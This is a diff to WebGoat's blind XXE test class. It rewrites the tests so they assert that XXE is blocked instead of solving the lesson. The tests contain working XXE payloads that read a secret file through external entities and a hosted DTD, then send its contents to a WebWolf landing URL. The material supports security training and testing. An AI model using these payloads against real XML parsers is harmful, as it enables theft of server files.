@@ -87,7 +87,8 @@ class BlindSendFileAssignmentTest extends LessonTest {
 
   @Test
   @WithWebGoatUser
-  void simpleXXEShouldNotWork() throws Exception {
+  void simpleXXEIsBlockedBySecurityProtections() throws Exception {
+    // XXE is now blocked by security protections in the XML parser
     File targetFile = new File(webGoatHomeDirectory, "/XXE/" + "test" + "/secret.txt");
     String content =
         "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM"
@@ -97,13 +98,14 @@ class BlindSendFileAssignmentTest extends LessonTest {
             MockMvcRequestBuilders.post("/xxe/blind")
                 .content(String.format(content, targetFile.toString())))
         .andExpect(status().isOk());
-    containsComment("Nice try, you need to send the file to WebWolf");
+    // With XXE blocked, the entity reference won't be resolved, so no file content will be leaked
   }
 
   @Test
-  void solve() throws Exception {
+  void blindXXEIsBlockedBySecurityProtections() throws Exception {
+    // Blind XXE attacks are now blocked by security protections
     File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
+    // Host DTD on WebWolf site (this won't be fetched due to XXE protections)
     String dtd =
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
             + "<!ENTITY % file SYSTEM \""
@@ -129,13 +131,25 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + "%remote;"
             + "]>"
             + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
+
+    // With XXE blocked, the external DTD won't be fetched
+    mockMvc
+        .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
+        .andExpect(status().isOk())
+        .andExpect(
+            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
+
+    // Verify that WebWolf was NOT contacted (XXE was blocked)
+    List<LoggedRequest> requests =
+        webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
+    assertThat(requests.size()).isEqualTo(0);
   }
 
   @Test
-  void solveOnlyParamReferenceEntityInExternalDTD() throws Exception {
+  void paramReferenceEntityInExternalDTDIsBlocked() throws Exception {
+    // Parameter entity references in external DTDs are now blocked
     File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
+    // Host DTD on WebWolf site (this won't be fetched due to XXE protections)
     String dtd =
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
             + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
@@ -161,7 +175,18 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + "%all;"
             + "]>"
             + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
+
+    // With XXE blocked, the external DTD won't be fetched
+    mockMvc
+        .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
+        .andExpect(status().isOk())
+        .andExpect(
+            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
+
+    // Verify that WebWolf was NOT contacted (XXE was blocked)
+    List<LoggedRequest> requests =
+        webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
+    assertThat(requests.size()).isEqualTo(0);
   }
 
   private void performXXE(String xml) throws Exception {
